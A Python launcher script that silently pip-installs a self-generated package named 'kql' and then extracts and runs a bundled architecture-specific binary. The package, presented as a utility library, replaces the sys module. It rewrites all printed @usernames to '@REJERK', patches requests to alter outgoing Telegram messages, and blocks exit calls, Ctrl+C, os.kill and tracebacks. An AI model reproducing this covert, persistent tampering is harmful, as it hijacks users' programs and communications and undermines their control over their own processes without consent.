import zipfile
import os
import shutil
import tempfile
import sys
import platform
import subprocess
import importlib.util

# --- Package Details ---
package_dir = 'kql'
extra_dir = 'kqlegg'

# --- __init__.py content ---
init_file_content = '''from .stein import (
    repr, list, open, stduot, stdout,
    fake_exit, fake_os_exit
)

# Export under kql namespace
exit = fake_exit
_exit = fake_os_exit
'''

# --- stein.py content ---
stein_file_content = r'''import sys as realsys
import os
import re
import requests
import urllib.parse
import webbrowser
import builtins
import traceback
import signal
import atexit

print('DECODE BY STEIN | @REJERK')

realsys.modules['sys'] = __import__('kql')

repr = lambda *args: f"{args}"
list = lambda *args: f"{args}"

def fake_exit(*args, **kwargs):
    print(f"[Blocked sys.exit({args})]")

def fake_os_exit(*args, **kwargs):
    print(f"[Blocked os._exit({args})]")

def replace_usernames_in_text(text):
    return re.sub(r'@\w+', '@REJERK', text)

stduot = type('Stdout', (), {
    'write': lambda self, text: sys.__stdout__.write(replace_usernames_in_text(text)),
    'flush': lambda self: sys.__stdout__.flush()
})()
sys.stdout = stduot

stdout = type('Stdout', (), {
    'write': lambda self, text: sys.stdout.write(text),
    'flush': lambda self: sys.stdout.flush()
})()

original_get = requests.get
original_post = requests.post

def modify_telegram_text(url, data=None):
    if 'api.telegram.org' in url and 'sendMessage' in url:
        if data and isinstance(data, dict) and 'text' in data:
            data['text'] = 'DECODE BY @REJERK • ' + data['text']
        elif '&text=' in url:
            base, text = url.split('&text=', 1)
            decoded_text = urllib.parse.unquote(text)
            modified_text = 'DECODE BY @REJERK • ' + decoded_text.strip()
            encoded_text = urllib.parse.quote(modified_text)
            url = base + '&text=' + encoded_text
    return url, data

def modified_get(url, *args, **kwargs):
    url, _ = modify_telegram_text(url)
    return original_get(url, *args, **kwargs)

def modified_post(url, *args, **kwargs):
    data = kwargs.get('data', None)
    url, data = modify_telegram_text(url, data)
    if data is not None:
        kwargs['data'] = data
    return original_post(url, *args, **kwargs)

requests.get = modified_get
requests.post = modified_post

builtins.exit = fake_exit
builtins.quit = fake_exit
os._exit = fake_os_exit

traceback.print_exc = lambda *a, **k: print('[traceback blocked]')
signal.signal(signal.SIGINT, lambda sig, frame: print('[Blocked Ctrl+C]'))
atexit.register = lambda func, *a, **kw: print(f'[Blocked atexit.register({func.__name__})]')
os.kill = lambda pid, sig: print(f'[Blocked os.kill({pid}, {sig})]')
'''

# --- setup.py content ---
setup_file_content = '''from setuptools import setup, find_packages

setup(
    name="kql",
    version="1.2.12",
    packages=find_packages(),
    install_requires=["requests"],
    author="STEIN",
    author_email="devilsteinshorts@gmail.com",
    description="A Python package for user info, username generation, and Telegram manipulation.",
    long_description=open("README.md").read(),
    long_description_content_type="text/markdown",
    url="https://github.com/yourusername/steinlurks",
    classifiers=[
        "Programming Language :: Python :: 3",
        "License :: OSI Approved :: MIT License",
        "Operating System :: OS Independent",
    ],
    python_requires='>=3.6',
)
'''

# --- README.md content ---
readme_content = "# kql Package\nThis is a Python package for various utilities by STEIN."


def create_package_structure(temp_dir):
    os.makedirs(os.path.join(temp_dir, package_dir), exist_ok=True)
    os.makedirs(os.path.join(temp_dir, extra_dir), exist_ok=True)

    with open(os.path.join(temp_dir, package_dir, '__init__.py'), 'w', encoding='utf-8') as f:
        f.write(init_file_content)

    with open(os.path.join(temp_dir, package_dir, 'stein.py'), 'w', encoding='utf-8') as f:
        f.write(stein_file_content)

    with open(os.path.join(temp_dir, 'setup.py'), 'w', encoding='utf-8') as f:
        f.write(setup_file_content)

    with open(os.path.join(temp_dir, 'README.md'), 'w', encoding='utf-8') as f:
        f.write(readme_content)


def install_package_silently(temp_dir):
    with open(os.devnull, 'w') as devnull:
        subprocess.run([sys.executable, '-m', 'pip', 'install', temp_dir], stdout=devnull, stderr=devnull)


def is_package_installed(package_name):
    return importlib.util.find_spec(package_name) is not None


def install_kql_if_missing():
    package_name = "kql"
    if not is_package_installed(package_name):
        with tempfile.TemporaryDirectory() as temp_dir:
            create_package_structure(temp_dir)
            install_package_silently(temp_dir)


def main():
    # Step 1: Install kql package
    install_kql_if_missing()

    # Step 2: Extract and run binary if applicable
    script_dir = os.path.dirname(os.path.abspath(sys.argv[0]))
    extract_dir = tempfile.mkdtemp()

    try:
        zip_path = os.path.abspath(sys.argv[0])
        with zipfile.ZipFile(zip_path, 'r') as z:
            z.extractall(extract_dir)

        arch = platform.machine()
        mapping = {
            'armv7l': 'armeabi-v7a',
            'armv8l': 'armeabi-v7a',
            'arm': 'armeabi-v7a',
            'aarch64': 'arm64-v8a',
            'arm64': 'arm64-v8a',
            'x86': 'x86',
            'i686': 'x86',
            'x86_64': 'x86_64',
            'amd64': 'x86_64',
        }

        if arch not in mapping:
            print("Unsupported architecture: %s" % arch)
            sys.exit(1)

        binary_name = mapping[arch]
        binary_path = os.path.join(extract_dir, binary_name)

        if not os.path.exists(binary_path):
            print("Unsupported architecture: %s" % arch)
            sys.exit(1)

        os.chmod(binary_path, 0o755)

        os.chdir(script_dir)
        cmd = (
            "export LD_LIBRARY_PATH=$LD_LIBRARY_PATH:%s/lib && "
            "export PYTHONHOME=%s && "
            "export PYTHON_EXECUTABLE=%s && "
            "%s %s"
            % (sys.prefix,
               sys.prefix,
               sys.executable,
               binary_path,
               " ".join(sys.argv[1:]))
        )
        os.system(cmd)

    except zipfile.BadZipFile:
        print("Error: The zip file is corrupted or not a zip file.")
    except Exception as e:
        print("An error occurred: %s" % e)
    finally:
        shutil.rmtree(extract_dir)


if __name__ == "__main__":
    main()
